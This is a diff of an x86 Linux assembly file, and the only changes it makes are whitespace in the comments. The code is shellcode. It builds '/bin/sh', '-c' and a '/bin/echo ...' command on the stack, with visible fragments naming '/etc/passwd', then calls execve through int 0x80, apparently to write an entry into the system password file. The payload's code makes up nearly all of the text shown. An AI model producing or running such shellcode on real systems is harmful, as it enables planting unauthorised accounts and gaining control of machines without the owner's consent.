@@ -8,13 +8,13 @@ global _start
 section .text
 _start:
 
-	xor edx, edx			; EDX = 0
-	push edx				; NULL (for envp)
-	push edx				; Placeholder for pointer to "/bin/echo ..."
-	push edx				; Placeholder for pointer to "-c"
-	push edx				; Placeholder for pointer to "/bin/sh"
+	xor edx, edx		; EDX = 0
+	push edx		; NULL (for envp)
+	push edx		; Placeholder for pointer to "/bin/echo ..."
+	push edx		; Placeholder for pointer to "-c"
+	push edx		; Placeholder for pointer to "/bin/sh"
 	
-	push word dx			; ..
+	push word dx		; ..
 	push word 0x6477        ; "dw"
 	push 0x73736170         ; "ssap"
 	push 0x2f637465         ; "/cte"
@@ -34,8 +34,8 @@ _start:
 	push 0x2368732f         ; "#hs/"
 	push 0x6e69622f         ; "nib/"
 
-	mov [esp + 0x7], dl		; Replacing '#' with '\x00'
-	mov [esp + 0xa], dl		; ...
+	mov [esp + 0x7], dl	; Replacing '#' with '\x00'
+	mov [esp + 0xa], dl	; ...
 
 	mov [esp + 0x48], esp	; Write address of "/bin/sh" to memory
 	lea ebx, [esp + 0x8]	; Load address of "-c" into EBX
@@ -43,11 +43,11 @@ _start:
 	lea ebx, [esp + 0xb]	; Load address of "/bin/echo ..." into EBX
 	mov [esp + 0x50], ebx	; Write address of "/bin/echo ..." to memory
 
-	mov ebx, esp			; EBX => const char *pathname = "/bin/sh"
+	mov ebx, esp		; EBX => const char *pathname = "/bin/sh"
 
-	mov eax, edx			; EAX = 0
-	mov al, 0xb				; EAX = 0xB (SYS_EXECVE)
+	mov eax, edx		; EAX = 0
+	mov al, 0xb		; EAX = 0xB (SYS_EXECVE)
 	lea ecx, [ebx + 0x48]	; ECX => char *const argv[] = *{'/bin/sh', '-c', '/bin/echo ...'}
 	lea edx, [ebx + 0x54]	; EDX => char *const envp[] = *NULL
 
-	int 0x80				; int execve(const char *pathname, char *const argv[], char *const envp[]);
+	int 0x80		; int execve(const char *pathname, char *const argv[], char *const envp[]);
